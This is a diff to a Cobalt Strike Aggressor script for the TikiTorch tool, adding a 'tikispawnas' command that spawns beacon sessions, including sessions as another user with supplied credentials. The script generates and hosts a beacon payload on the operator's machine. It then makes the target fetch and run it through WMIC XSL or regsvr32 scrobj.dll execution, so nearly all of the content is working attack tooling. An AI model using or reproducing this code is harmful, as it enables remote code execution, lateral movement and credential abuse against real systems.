@@ -1,12 +1,3 @@
-beacon_command_register (
-
-	"tikispawn", 
-	"Spawn a session via TikiTorch", 
-	"Use: tikispawn [x86|x64] [listener] [binary] [format]\n\n" .
-	"Spawn a new session as the current user via TikiTorch."
-
-);
-
 sub get_template {
 
 	$arch = $1;
@@ -92,23 +83,6 @@ sub host_payload {
 	$url = site_host($host, $port, $uri, $data, "plain/text", "TikiTorch");
 	return $url;
 
-}
-
-sub execute_payload {
-	
-	$bid = $1;
-	$format = $2;
-	$url = $3;
-
-	if ($format eq "xsl") {
-
-		beacon_execute_job($bid, "C:\\Windows\\System32\\wbem\\WMIC.exe", " os get /format:\" $+ $url $+ \"", 0);
-
-	} else if ($format eq "sct") {
-
-
-
-	}
 }
 
 sub remove_payload {
@@ -214,7 +188,11 @@ alias tikispawn {
 	### Execute It ###
 	##################
 
-	execute_payload($bid, $format, $url);
+	if ($format eq "xsl") {
+		beacon_execute_job($bid, "C:\\Windows\\System32\\wbem\\WMIC.exe", " os get /format:\" $+ $url $+ \"", 0);
+	} else if ($format eq "sct") {
+		beacon_execute_job($bid, "C:\\Windows\\System32\\regsvr32.exe", " /s /n /u /i:\" $+ $url $+ \" scrobj.dll", 0);
+	}
 
 	###################
 	### Remove Site ###
@@ -224,3 +202,145 @@ alias tikispawn {
 	#remove_payload($port, $uri);
 
 }
+
+alias tikispawnas {
+
+	$bid = $1;
+
+	$input = substr($0, 12);
+	@args = split(' ', $input);
+
+	#########################
+	### Check Args Length ###
+	#########################
+
+	if (size(@args) eq "6") {
+
+		$user = @args[0];
+		$pass = @args[1];
+		$arch = @args[2];
+		$listener = @args[3];
+		$process = @args[4];
+		$format = @args[5];
+
+	} else {
+
+		berror($bid, "Invalid number of arguments");
+		return;
+
+	}
+
+	@parts = split('\\\\', $user);
+
+	if (size(@parts) eq "1") {
+
+		$domain = ".";
+		$user = @parts[0];
+
+	} else if (size(@parts) eq 2) {
+
+		$domain = @parts[0];
+		$user = @parts[1];
+
+	} else {
+
+		berror($bid, "Confused about the username");
+		return;
+
+	}
+
+	######################
+	### Error Handling ###
+	######################
+
+	if (($arch ne "x64") && ($arch ne "x86")) {
+		berror($bid, "Invalid architecture");
+		return;
+	}
+
+	if (listener_info($listener, "payload") eq "") {
+		berror($bid, "Invalid listener");
+		return;
+	}
+
+	@valid_formats = @("xsl", "sct");
+	$check = iff($format in @valid_formats, "true", "false");
+
+	if ($check eq "false") {
+		berror($bid, "Invalid payload format");
+		return;
+	}
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " via TikiTorch " . $format . " as " . $user);
+
+	########################
+	### Generate Payload ###
+	########################
+
+	artifact_stageless($listener, "raw", $arch, "", $this);
+	yield;
+	$payload = base64_encode($1);
+
+	#####################
+	### Grab Template ###
+	#####################
+
+	$template = get_template($arch, $format);
+
+	################
+	### Data Sub ###
+	################
+
+	$final = data_sub($process, $payload, $format, $template);
+
+	####################
+	### Host Payload ###
+	####################
+
+	$host = localip();
+	$port = "80";
+
+	@letters = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
+
+	$uri = "/";
+
+	for ($i = 0; $i < 9; $i++) {
+		$uri = $uri . rand(@letters);
+	}
+
+	if ($format eq "xsl") {
+		$uri = $uri . ".xsl"
+	}
+
+	$url = host_payload($host, $port, $uri, $final);
+
+	##################
+	### Execute It ###
+	##################
+
+	if ($format eq "xsl") {
+		brunas($bid, "$domain", "$user", "$pass", "C:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\" $+ $url $+ \"");
+	} else if ($format eq "sct") {
+		brunas($bid, "$domain", "$user", "$pass", "C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:\" $+ $url $+ \" scrobj.dll");
+	}
+
+}
+
+beacon_command_register (
+
+	"tikispawn", 
+	"Spawn a session via TikiTorch", 
+	"Use: tikispawn [x86|x64] [listener] [binary] [format]\n\n" .
+	"Spawn a new session as the current user via TikiTorch."
+
+);
+
+beacon_command_register (
+
+	"tikispawnas", 
+	"Spawn a session as another user via TikiTorch", 
+	"Use: tikispawnas [DOMAIN\\user] [password] [x86|x64] [listener] [binary] [format]\n\n" .
+	"Attempt to spawn a payload as another user. If you don't specify DOMAIN\n" .
+	"Beacon will try to authenticate as a local user."
+
+);
